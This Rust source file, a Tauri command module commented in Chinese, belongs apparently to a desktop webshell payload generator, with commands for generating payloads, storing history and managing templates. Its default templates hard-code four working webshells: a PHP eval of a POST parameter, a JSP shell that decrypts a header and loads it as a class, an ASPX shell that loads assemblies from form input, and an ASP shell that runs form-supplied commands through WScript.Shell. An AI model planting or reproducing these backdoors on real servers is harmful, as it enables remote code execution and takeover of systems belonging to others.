/// Tauri 命令模块 - 载荷生成相关命令

use crate::core::generator::generate_payload;
use crate::types::payload::*;
use tauri::State;
use std::sync::Mutex;
use std::fs;
use std::path::PathBuf;


// 使用标准 Result 类型，避免与 types::payload::Result 冲突
type CommandResult<T> = std::result::Result<T, String>;

/// 应用状态
pub struct AppState {
    pub generated_payloads: Mutex<Vec<PayloadResult>>,
    pub templates: Mutex<Vec<PayloadTemplate>>,
    pub data_dir: PathBuf,
}

impl AppState {
    pub fn new(data_dir: PathBuf) -> Self {
        let history_path = data_dir.join("payload_history.json");
        let payloads = if history_path.exists() {
            match fs::read_to_string(&history_path) {
                Ok(content) => match serde_json::from_str(&content) {
                    Ok(data) => data,
                    Err(_) => Vec::new(),
                },
                Err(_) => Vec::new(),
            }
        } else {
            Vec::new()
        };

        let templates_path = data_dir.join("payload_templates.json");
        let templates = if templates_path.exists() {
            match fs::read_to_string(&templates_path) {
                Ok(content) => match serde_json::from_str(&content) {
                    Ok(data) => data,
                    Err(_) => Self::create_default_templates(),
                },
                Err(_) => Self::create_default_templates(),
            }
        } else {
            Self::create_default_templates()
        };

        Self {
            generated_payloads: Mutex::new(payloads),
            templates: Mutex::new(templates),
            data_dir,
        }
    }

    pub fn save_history(&self) -> CommandResult<()> {
        let payloads = self.generated_payloads.lock().map_err(|e| e.to_string())?;
        let payloads_clone = payloads.clone();
        let history_path = self.data_dir.join("payload_history.json");
        
        let json = serde_json::to_string_pretty(&payloads_clone)
            .map_err(|e| format!("Failed to serialize history: {}", e))?;
        
        fs::write(&history_path, &json)
            .map_err(|e| format!("Failed to write history file: {}", e))?;
        
        Ok(())
    }

    pub fn save_templates(&self) -> CommandResult<()> {
        let templates = self.templates.lock().map_err(|e| e.to_string())?;
        let templates_clone = templates.clone();
        let templates_path = self.data_dir.join("payload_templates.json");
        
        let json = serde_json::to_string_pretty(&templates_clone)
            .map_err(|e| format!("Failed to serialize templates: {}", e))?;
        
        fs::write(&templates_path, &json)
            .map_err(|e| format!("Failed to write templates file: {}", e))?;
        
        Ok(())
    }

    fn create_default_templates() -> Vec<PayloadTemplate> {
        use chrono::Utc;
        let now = Utc::now().to_rfc3339();
        
        vec![
            PayloadTemplate {
                name: "PHP Basic Shell".to_string(),
                script_type: ScriptType::Php,
                function_type: FunctionType::Basic,
                code: "<?php @eval($_POST['{{password}}']);?>".to_string(),
                description: "基础 PHP WebShell 模板".to_string(),
                created_at: now.clone(),
                updated_at: now.clone(),
            },
            PayloadTemplate {
                name: "JSP Basic Shell".to_string(),
                script_type: ScriptType::Jsp,
                function_type: FunctionType::Basic,
                code: "<%@page import=\"java.util.*,javax.crypto.*,javax.crypto.spec.*\"%><%!class U extends ClassLoader{{U(ClassLoader c){{super(c);}}public Class g(byte []b){{return super.defineClass(b,0,b.length);}}}}%><%if(request.getParameter(\"{{password}}\")!=null){{byte[]k=\"{{password}};\".getBytes();session.putValue(\"u\",k);out.write(\"OK\".getBytes());return;}}byte[]k=(byte[])session.getValue(\"u\");PasswordEngine pe=new PasswordEngine(k);if(request.getHeader(\"X-Data\")!=null){{String data=request.getHeader(\"X-Data\");U u=new U(this.getClass().getClassLoader());u.g(pe.decrypt(data)).newInstance();}}%>".to_string(),
                description: "基础 JSP WebShell 模板".to_string(),
                created_at: now.clone(),
                updated_at: now.clone(),
            },
            PayloadTemplate {
                name: "ASPX Basic Shell".to_string(),
                script_type: ScriptType::Aspx,
                function_type: FunctionType::Basic,
                code: "<%@ Page Language=\"C#\" %><%@ Import Namespace=\"System.Reflection\" %><%@ Import Namespace=\"System.IO\" %><script runat=\"server\">protected void Page_Load(object sender, EventArgs e){{string k=\"{{password}}\";string c=Request.Form[k];if(!string.IsNullOrEmpty(c)){{Assembly.Load(Encoding.Default.GetBytes(c)).CreateInstance(\"x\").GetType().GetMethod(\"y\").Invoke(null,new object[]{{this}});}}}}</script>".to_string(),
                description: "基础 ASPX WebShell 模板".to_string(),
                created_at: now.clone(),
                updated_at: now.clone(),
            },
            PayloadTemplate {
                name: "ASP Basic Shell".to_string(),
                script_type: ScriptType::Asp,
                function_type: FunctionType::Basic,
                code: "Dim cmd\ncmd = Request.Form(\"{{password}}\")\nIf cmd <> \"\" Then\n    Dim shell\n    Set shell = Server.CreateObject(\"WScript.Shell\")\n    Dim exec\n    Set exec = shell.Exec(cmd)\n    Response.Write \"<pre>\" & exec.StdOut.ReadAll() & \"</pre>\"\nEnd If".to_string(),
                description: "基础 ASP WebShell 模板".to_string(),
                created_at: now.clone(),
                updated_at: now.clone(),
            },
        ]
    }
}

/// 生成载荷
#[tauri::command]
pub async fn generate_payload_cmd(
    config: PayloadConfig,
    state: State<'_, AppState>,
) -> CommandResult<PayloadResult> {
    // 调用生成器
    let result = generate_payload(&config)
        .map_err(|e| e.to_string())?;
    
    // 保存到历史记录
    {
        let mut payloads = state.generated_payloads.lock().map_err(|e| e.to_string())?;
        payloads.push(result.clone());
        // 限制历史记录数量
        let len = payloads.len();
        if len > 100 {
            payloads.drain(0..len - 100);
        }
    }
    
    // 持久化到文件
    state.save_history()?;
    
    Ok(result)
}

/// 获取已生成的载荷列表
#[tauri::command]
pub async fn get_generated_payloads(
    state: State<'_, AppState>,
) -> CommandResult<Vec<PayloadResult>> {
    let payloads = state.generated_payloads.lock().map_err(|e| e.to_string())?;
    Ok(payloads.clone())
}

/// 保存文件
#[tauri::command]
pub async fn save_file_cmd(
    path: String,
    content: String,
) -> CommandResult<()> {
    use std::fs;
    
    // 使用标准库写入文件
    fs::write(&path, &content)
        .map_err(|e| format!("Failed to write file: {}", e))?;
    
    Ok(())
}

/// 导出客户端配置
#[tauri::command]
pub async fn export_client_config_cmd(
    config: ClientConfig,
    path: String,
) -> CommandResult<()> {
    use std::fs;
    
    let json = serde_json::to_string_pretty(&config)
        .map_err(|e| format!("Failed to serialize config: {}", e))?;
    
    fs::write(&path, &json)
        .map_err(|e| format!("Failed to write config file: {}", e))?;
    
    Ok(())
}

/// 清除历史记录
#[tauri::command]
pub async fn clear_payload_history(
    state: State<'_, AppState>,
) -> CommandResult<()> {
    // 清空内存中的历史记录
    {
        let mut payloads = state.generated_payloads.lock().map_err(|e| e.to_string())?;
        payloads.clear();
    }
    
    // 持久化到文件
    state.save_history()?;
    
    Ok(())
}

/// 获取模板列表
#[tauri::command]
pub async fn get_payload_templates(
    state: State<'_, AppState>,
) -> CommandResult<Vec<PayloadTemplate>> {
    let templates = state.templates.lock().map_err(|e| e.to_string())?;
    Ok(templates.clone())
}

/// 添加模板
#[tauri::command]
pub async fn add_payload_template(
    template: PayloadTemplate,
    state: State<'_, AppState>,
) -> CommandResult<PayloadTemplate> {
    let mut templates = state.templates.lock().map_err(|e| e.to_string())?;
    
    // 检查模板是否已存在
    if templates.iter().any(|t| t.name == template.name) {
        return Err("模板已存在".to_string());
    }
    
    templates.push(template.clone());
    state.save_templates()?;
    
    Ok(template)
}

/// 更新模板
#[tauri::command]
pub async fn update_payload_template(
    template: PayloadTemplate,
    state: State<'_, AppState>,
) -> CommandResult<PayloadTemplate> {
    let mut templates = state.templates.lock().map_err(|e| e.to_string())?;
    
    // 查找并更新模板
    if let Some(index) = templates.iter().position(|t| t.name == template.name) {
        templates[index] = template.clone();
        state.save_templates()?;
        Ok(template)
    } else {
        Err("模板不存在".to_string())
    }
}

/// 删除模板
#[tauri::command]
pub async fn delete_payload_template(
    name: String,
    state: State<'_, AppState>,
) -> CommandResult<()> {
    let mut templates = state.templates.lock().map_err(|e| e.to_string())?;
    
    // 查找并删除模板
    if let Some(index) = templates.iter().position(|t| t.name == name) {
        templates.remove(index);
        state.save_templates()?;
        Ok(())
    } else {
        Err("模板不存在".to_string())
    }
}

/// 获取单个模板
#[tauri::command]
pub async fn get_payload_template(
    name: String,
    state: State<'_, AppState>,
) -> CommandResult<PayloadTemplate> {
    let templates = state.templates.lock().map_err(|e| e.to_string())?;
    
    if let Some(template) = templates.iter().find(|t| t.name == name) {
        Ok(template.clone())
    } else {
        Err("模板不存在".to_string())
    }
}
